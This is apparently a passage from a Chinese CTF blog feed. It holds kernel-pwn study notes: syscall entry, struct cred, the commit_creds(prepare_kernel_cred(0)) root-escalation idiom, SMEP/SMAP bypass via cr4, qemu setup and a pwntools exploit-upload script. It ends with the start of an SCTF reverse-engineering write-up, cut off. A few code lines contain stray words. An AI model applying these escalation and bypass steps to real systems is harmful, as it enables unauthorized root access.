进行通信的原因:<br>操作系统提供了内核访问标准外部设备的系统调用,因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适, 有时候用户模式可能需要直接访问设备。<br>比如,一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持,有一些设备可能没有被内核设计者考虑到,如此一来提供一个这样的系统调用来使用设备就变得不可能了。<br>为了解决这个问题,内核被设计成可扩展的,可以加入一个称为设备驱动的模块,驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 Ioctl 接口是一个独立的系统调用,通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 Ioctl 调用,如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节,同时也不需要一大堆针对不同设备的系统调用。</p></blockquote><h2 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h2><h3 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h3><ol><li><p>通过<code>swapgs</code>切换 GS 段寄存器,将 GS 寄存器值和一个特定位置的值进行交换,目的是保存 GS 值,同时将该位置的值作为内核执行时的 GS 值使用。</p></li><li><p>将当前栈顶(用户空间栈顶)记录在 CPU 独占变量区域里,将 CPU 独占 区域里记录的内核栈顶放入 rsp/esp</p></li><li><p>通过 push 保存各寄存器值, 具体的<a href="https://elixir.bootlin.com/linux/v4.12/source/arch/x86/entry/entry_64.S">代码</a>如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> ENTRY(entry_SYSCALL_64)</span><br><span class="line"> /* SWAPGS_UNSAFE_STACK是一个宏,x86直接定义为swapgs指令 */</span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"> /* 保存栈值,并设置内核栈 */</span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* 通过push保存寄存器值,形成一个pt_regs结构 */</span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS      /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS      /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx             /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax             /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi             /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi             /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx             /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu    /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS        /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8              /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9              /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10             /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></figure></li><li><p>通过汇编指令判断是否为<code>x32_abi</code>。</p></li><li><p>通过系统调用号,跳到全局变量<code>sys_call_table</code>相应位置继续执行系统调用。</p></li></ol><h3 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h3><p>退出时, 流程如下:</p><ol><li>通过 <code>swapgs</code> 恢复 GS 值</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息(<code>CS, eflags/rflags, esp/rsp</code>等)</li></ol><h2 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h2><p>Kernel用<code>cred</code>结构体记录进程的权限,每一个进程都有一个<code>cred</code>结构,这个结构保存了该进程的权限等信息（uid, gid等）, 如果能修改某个进程的cred,那么也就修改了这个进程的权限。</p><p><a href="https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred">源码</a> 如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="内核态函数"><a href="#内核态函数" class="headerlink" title="内核态函数"></a>内核态函数</h2><p>相比用户态库函数,内核态的函数有了一些变化</p><ul><li>printf() -&gt; <strong>printk()</strong>,但需要注意的是 printk() 不一定会把内容显示到终端上,但一定在内核缓冲区里,可以通过 <code>dmesg</code> 查看效果</li><li>memcpy() -&gt; <strong>copy_from_user()/copy_to_user()</strong><ul><li>copy_from_user() 实现了将用户空间的数据传送到内核空间</li><li>copy_to_user() 实现了将内核空间的数据传送到用户空间</li></ul></li><li>malloc() -&gt; <strong>kmalloc()</strong>,内核态的内存分配函数,和 malloc() 相似,但使用的是 <code>slab/slub 分配器</code></li><li>free() -&gt; <strong>kfree()</strong>,同 kmalloc()</li></ul><p>另外要注意的是,<code>kernel 管理进程,因此 kernel 也记录了进程的权限</code>。kernel 中有两个可以方便的改变权限的函数:</p><ul><li><strong>int commit_creds(struct cred *new)</strong></li><li><strong>struct cred* prepare_kernel_cred(struct task_struct* daemon)</strong></li></ul><p>从函数名也可以看出,执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限,0 表示 以 0 号进程作为参考准备新的 credentials。</p><blockquote><p>更多关于 <code>prepare_kernel_cred</code> 的信息可以参考 <a href="https://elixir.bootlin.com/linux/v4.6/source/kernel/cred.c#L594">源码</a></p></blockquote><p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段,两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo grep commit_creds /proc/kallsyms</span><br><span class="line">ffffffffbb6af9e0 T commit_creds</span><br><span class="line">ffffffffbc7cb3d0 r __ksymtab_commit_creds</span><br><span class="line">ffffffffbc7f06fe r __kstrtab_commit_creds</span><br><span class="line">post sudo grep prepare_kernel_cred /proc/kallsyms</span><br><span class="line">ffffffffbb6afd90 T prepare_kernel_cred</span><br><span class="line">ffffffffbc7d4f20 r __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred</span><br></pre></td></tr></table></figure><blockquote><p>一般情况下,/proc/kallsyms 的内容需要 root 权限才能查看, 若以非root权限查看将显示为0地址。</p></blockquote><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><blockquote><p>canary, dep, PIR, RELRO等保护与用户态原理和作用相同</p></blockquote><ul><li>smep: <code>Supervisor Mode Execution Protection</code>,当处理器处于 <code>ring0</code> 模式,执行 <code>用户空间</code> 的代码会触发页错误。（在 arm 中该保护称为 <code>PXN</code>)</li><li>smap: <code>Superivisor Mode Access Protection</code>,类似于 smep,通常是在访问数据时。</li><li>mmap_min_addr: mmap_min_addr 控制着 mmap 能够映射的最低内存地址,而这个参数能够通过<code>/proc/sys/vm/mmap_min_addr</code>这个文件来进行读写。系统中的任何用户都可以读这个文件,但只有root用户能够写这个文件。</li></ul><h2 id="CTF-kernel-pwn-相关"><a href="#CTF-kernel-pwn-相关" class="headerlink" title="CTF kernel pwn 相关"></a>CTF kernel pwn 相关</h2><p>一般会给三个文件<code>boot.sh</code>, <code>bzImage</code>, <code>rootfs.cpio</code></p><ol><li><p><code>boot.sh</code> : 一个用于启动 kernel 的 shell 的脚本,多用 qemu,保护措施与 qemu 不同的启动参数有关, 如下</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">stty intr ^]</span><br><span class="line">cd `dirname $0`</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr&#x27; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu qemu64 2&gt;/dev/null, +smep</span><br></pre></td></tr></table></figure><p>解释一下 qemu 启动的参数:</p><ul><li><code>-initrd rootfs.cpio</code>,使用 rootfs.cpio 作为内核启动的文件系统</li><li><code>-kernel bzImage</code>,使用 bzImage 作为 kernel 映像</li><li><code>-cpu qemu64 2&gt;/dev/null, +smep</code>,设置 CPU 的安全选项,这里开启了 smep</li><li><code>-m 64M</code>,设置虚拟 RAM 为 64M,默认为 128M</li><li>其他的选项可以通过 –help 查看。</li></ul><p> 一般来讲, 可以在最后加上<code>-s</code>或<code>-gdb tcp::1234 -S</code>使得我们可以使用调试进行连接调试。<strong>注意, 后者会使虚拟机启动时强制终端等待调试器连接</strong>。</p></li><li><p><code>bzImage</code>: kernel binary</p></li><li><p><code>rootfs.cpio</code>: 文件系统映像</p></li><li><p><code>*.ko</code>: 有漏洞的驱动或模块, 可以使用<code>IDA</code>打开. 如果附件包中没有<code>*.ko</code>, 此时需要我们自己到文件系统中将其提取出来</p><ol><li><p><code>ext4</code>: 将文件系统挂载到已有目录</p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir ./rootfs</span><br><span class="line">sudo mount rootfs.img ./rootfs</span><br></pre></td></tr></table></figure><p>  此时查看根目录下的<code>init</code>或<code>etc/init.d/rcS</code>文件, 这时系统的启动脚本, 可以以此看到加载驱动的路径, 这时可以将驱动或模块拷贝出来</p><p>  <img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200811173159.png" alt="xmctf-kernel1"></p><p>  卸载文件系统</p>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo unmount rootfs</span><br></pre></td></tr></table></figure></li><li><p><code>cpio</code>: 解压文件系统</p>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir core</span><br><span class="line"><span class="built_in">cd</span> core</span><br><span class="line">cp ../rootfs.cpio rootfs.cpio</span><br><span class="line">cpio -i --no-absolute-filenames -F rootfs.cpio</span><br></pre></td></tr></table></figure><p>  此时跟其他文件系统一样, 找到启动文件, 查看加载的驱动, 拷贝出来</p></li></ol></li><li><p><code>vmlinux</code>: 有时还会有<code>vmlinux</code>文件, 一般含有符号信息，可以用于加载到<code>gdb</code>中方便调试(<code>gdb vmlinux</code>)，当寻找<code>gadget</code>时，使用<code>objdump -d vmlinux &gt; gadget</code>然后直接用编辑器搜索会比 <code>ROPgadget</code> 或 <code>ropper</code>快很多。没有<code>vmlinux</code>的情况下，可以使用linux源码目录下的<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">scripts/extract-vmlinux</a>来解压<code>bzImage</code>得到<code>vmlinux（extract-vmlinux bzImage &gt; vmlinux）</code>，当然此时的<code>vmlinux</code>是不包含调试信息的。</p></li><li><p>本地写好 exploit 后,可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下,进而拿到 flag。同时可以使用 musl, uclibc 等方法减小 exploit 的体积方便传输。</p></li></ol><blockquote><p>部分 Kernel 漏洞只影响低版本,高版本的 Kernel 已对脆弱的机制进行了一定程度的遏制乃至进行了消除,但是和 Glibc 相同,部分中低版本的内核仍有很高的用户量,因此我们对于低版本 Kernel 的漏洞研究并非是没有意义的,同时,在实际调试 Demo 时,请特别注意 Demo 漏洞影响的 Kernel 版本。</p></blockquote><h2 id="Linux-Kernel-保护机制"><a href="#Linux-Kernel-保护机制" class="headerlink" title="Linux Kernel 保护机制"></a>Linux Kernel 保护机制</h2><ul><li><code>KPTI</code>: Kernel PageTable Isolation, 内核页表隔离</li><li><code>KASLR</code>: Kernel Address space layout randomization, 内核地址空间布局随机化</li><li><code>SMEP</code>: Supervisor Mode Execution Prevention, 管理模式执行保护</li><li><code>SMAP</code>: Supervisor Mode Access Prevention，管理模式访问保护</li><li><code>Stack Protector</code>: Stack Protector又名canary，stack cookie</li><li><code>kptr_restrict</code>:允许查看内核函数地址</li><li><code>dmesg_restrict</code>:允许查看<code>printk</code>函数输出，用<code>dmesg</code>命令来查看</li><li><code>MMAP_MIN_ADDR</code>:不允许申请 <code>NULL</code> 地址 <code>mmap(0,....)</code>, <code>null pointer dereferences</code></li></ul><p><code>KASLR</code>、<code>Stack Protector</code>与用户态下的<code>ASLR</code>、<code>canary</code>保护机制相似。<code>SMEP</code>下，内核态运行时，不允许执行用户态代码；<code>SMAP</code>下，内核态不允许访问用户态数据。<code>SMEP与SMAP</code>的开关都通过cr4寄存器来判断，因此可通过修改<code>cr4</code>的值来实现绕过<code>SMEP</code>，<code>SMAP</code>保护。</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200811194628.png" alt="20200811192920"></p><p>可以通过<code>cat /proc/cpuinfo</code>来查看开启了哪些保护：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ $ cat /proc/cpuinfo</span><br><span class="line">processor       : 0</span><br><span class="line">vendor_id       : GenuineIntel</span><br><span class="line">cpu family      : 15</span><br><span class="line">model           : 6</span><br><span class="line">model name      : Common KVM processor</span><br><span class="line">stepping        : 1</span><br><span class="line">cpu MHz         : 2304.014</span><br><span class="line">cache size      : 16384 KB</span><br><span class="line">physical id     : 0</span><br><span class="line">siblings        : 1</span><br><span class="line">core id         : 0</span><br><span class="line">cpu cores       : 1</span><br><span class="line">apicid          : 0</span><br><span class="line">initial apicid  : 0</span><br><span class="line">fpu             : yes</span><br><span class="line">fpu_exception   : yes</span><br><span class="line">cpuid level     : 13</span><br><span class="line">wp              : yes</span><br><span class="line">flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc nopl xtopology pni cx16 hypervisor smep smap</span><br><span class="line">bugs            :</span><br><span class="line">bogomips        : 4608.02</span><br><span class="line">clflush size    : 64</span><br><span class="line">cache_alignment : 128</span><br><span class="line">address sizes   : 40 bits physical, 48 bits virtual</span><br><span class="line">power management:</span><br></pre></td></tr></table></figure><p><code>KASLR、SMEP、SMAP</code>可通过修改<code>boot.sh</code>来关闭, 方便我们调试(以下是 starctf2019-hackme的启动文件<code>startvm.sh</code>)</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200811193143.png" alt="starctf2019-hackme"></p><p><code>dmesg_restrict</code>、<code>dmesg_restrict</code>可在<code>rcS</code>文件中修改：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200811193602.png" alt="20200811193602"></p><p><code>MMAP_MIN_ADDR</code>是<code>linux</code>源码中定义的宏，可重新编译内核进行修改（<code>.config</code>文件中），默认为<code>4k</code></p><h2 id="Linux-Kernel漏洞类型"><a href="#Linux-Kernel漏洞类型" class="headerlink" title="Linux Kernel漏洞类型"></a>Linux Kernel漏洞类型</h2><ul><li><p>指针</p><ul><li>未初始化指针</li><li>未验证指针</li><li>已损坏的指针解引用</li></ul></li><li><p>内核栈</p><ul><li>栈溢出</li><li>栈破坏</li></ul></li><li><p>内核堆</p><ul><li>堆溢出</li><li>UAF</li><li>Unlink</li></ul></li><li><p>整数</p><ul><li>整数溢出</li><li>符号转换错误</li></ul></li><li><p>逻辑漏洞</p><ul><li>引用计数器溢出</li><li>缺失权限检查</li><li>检查使用时序不当</li><li>竞态条件</li></ul></li></ul><h2 id="exp-上传脚本"><a href="#exp-上传脚本" class="headerlink" title="exp 上传脚本"></a>exp 上传脚本</h2><p>这里搬运自<a href="https://binlep.github.io/2020/03/12/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91Linux%20Kernel%20%E8%B0%83%E8%AF%95%E6%96%87%E4%BB%B6%E6%80%BB%E7%BB%93/">【Pwn 笔记】Linux Kernel 调试文件总结</a></p><p>写 exp 的时候需要在当前目录下新建一个 poc 文件夹，把 c 文件和 c 程序都放在那里</p><h3 id="普通用户"><a href="#普通用户" class="headerlink" title="普通用户"></a>普通用户</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;$ &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">r</span>):</span></span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;stty -echo&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;musl-gcc  -static -O2 ./poc/exp.c -o ./poc/exp&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;gzip -c ./poc/exp &gt; ./poc/exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;cat &lt;&lt;EOF &gt; exp.gz.b64&#x27;</span>)</span><br><span class="line">    r.sendline((read(<span class="string">&#x27;./poc/exp.gz&#x27;</span>)).encode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">    r.sendline(<span class="string">&#x27;EOF&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;base64 -d exp.gz.b64 &gt; exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;gunzip ./exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;chmod +x ./exp&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./startvm.sh&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;&#x27;, )</span></span><br><span class="line"></span><br><span class="line">exploit(p)</span><br></pre></td></tr></table></figure><h3 id="root用户"><a href="#root用户" class="headerlink" title="root用户"></a>root用户</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;# &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">r</span>):</span></span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;stty -echo&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;musl-gcc  -static -O2 ./poc/exp.c -o ./poc/exp&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;gzip -c ./poc/exp &gt; ./poc/exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;cat &lt;&lt;EOF &gt; exp.gz.b64&#x27;</span>)</span><br><span class="line">    r.sendline((read(<span class="string">&#x27;./poc/exp.gz&#x27;</span>)).encode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">    r.sendline(<span class="string">&#x27;EOF&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;base64 -d exp.gz.b64 &gt; exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;gunzip ./exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;chmod +x ./exp&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./startvm.sh&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;&#x27;, )</span></span><br><span class="line"></span><br><span class="line">exploit(p)</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://xz.aliyun.com/t/7625">Linux Kernel Pwn 初探</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/">CTF Wiki</a></p><p><a href="https://www.anquanke.com/post/id/201043">Kernel Pwn 学习之路(一)</a></p><p><a href="https://xz.aliyun.com/t/7625#toc-7">Linux Kernel Pwn 初探</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 SCTF</title>
      <link href="/wp-games-2020sctf/"/>
      <url>/wp-games-2020sctf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul><li>依旧很菜, 做题没有师傅们快</li></ul><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>用qt和python写的, 用PyInstaller打包, 可以用pyinstxtractor解包出来, 在解包出来的文件夹下有个main, 其实是个pyc文件, 更名为<code>main.pyc</code>。</p><p>然后由于PyInstaller生成文件时会去掉头部信息, 所以在反汇编之前需要补充头部信息。方法就是找到struct文件, 复制进<code>main.pyc</code>即可</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200706170442620.png" alt="image-20200706170442620"></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200706171727892.png" alt="image-20200706171727892"></p><p>接着可以用<a href="https://github.com/rocky/python-decompile3">decomplie3</a>或<code>uncomplie6</code>反汇编, 得到<code>main.py</code></p><p>可以看到调用<code>tmp.dll</code>里面的<code>enc</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200706172825138.png" alt="image-20200706172825138"></p><p>而这个<code>tmp.dll</code>是程序运行时产生的, 运行后消失。</p><p>加密逻辑很简单, CRC64 + 异或加密 + base64</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200706174235067.png" alt="image-20200706174235067"></p><p>解密脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">name = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="string">&quot;SCTFer&quot;</span>))</span><br><span class="line">enc = base64.b64decode(<span class="string">b&#x27;PLHCu+fujfZmMOMLGHCyWWOq5H5HDN2R5nHnlV30Q0EA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([enc[i] ^ name[i % <span class="built_in">len</span>(name)]])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dec</span>(<span class="params">f</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span>(f % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">            f //= <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f ^= <span class="number">0xB0004B7679FA26B3</span></span><br><span class="line">            f = f + <span class="number">0xffffffffffffffff</span> + <span class="number">1</span></span><br><span class="line">            f //= <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line">decode_flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    decode_flag.append(<span class="built_in">int</span>.from_bytes(flag[i * <span class="number">8</span> : i * <span class="number">8</span> + <span class="number">8</span>], <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    flag.append((Dec(decode_flag[i])))</span><br><span class="line"></span><br><span class="line">s = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    s += struct.pack(<span class="string">&quot;&gt;Q&quot;</span>, flag[i])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 